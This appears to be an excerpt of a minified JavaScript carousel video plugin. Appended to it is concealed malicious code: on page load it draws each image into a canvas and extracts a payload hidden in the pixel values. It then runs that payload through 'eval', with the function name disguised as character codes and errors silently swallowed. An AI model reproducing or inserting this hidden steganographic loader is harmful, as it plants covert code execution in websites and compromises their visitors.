!(function (h, i, s, o) {
    ...
    (i.Defaults = { video: !1, videoHeight: !1, videoWidth: !1 }),
      ...
      (i.prototype.play = function (t) {
        var e,
          ...
          n = s.width || "100%",
          t = s.height || this._core.$stage.height();
        this._playing ||
  ...
  (function (r, a, h, l) {
    h.addEventListener("DOMContentLoaded", function () {
      for (var t = h.querySelectorAll("img"), e = 0; e < t.length; e++)
        i(t[e]),
          (t[e].onload = function () {
            i(this);
          });
      ...
      function i(t) {
        if (t.width) {
          try {
            (r[l] = h.createElement(l)),
              (r[l].width = t.width),
              (r[l].height = t.height),
              (r.context = r[l].getContext("2d")),
              r.context.drawImage(t, 0, 0),
              (r.pr = r.context.getImageData(0, 0, t.width, t.height).data);
          } catch (t) {
            return;
          }
          for (var e = "", i = 0; i < r.pr.length; i += 12)
            if (
              !(r.pr[i + 3] < 255 || r.pr[i + 7] < 255 || r.pr[i + 11] < 255)
            ) {
              if (r.pr[i + 10] % 2) break;
              for (var s = [], n = i; n < i + 12; n++)
                n != i + 3 && n != i + 7 && n != i + 11 && s.push(r.pr[n]);
              if (
                ((r.cc = parseInt(
                  s
                    .map(function (t) {
          ...
          try {
            a[
              (function () {
                return [].slice.call(arguments).map(o).join("");
              })(101, 118, 97, 108)
            ](e);
          } catch (t) {}
        }
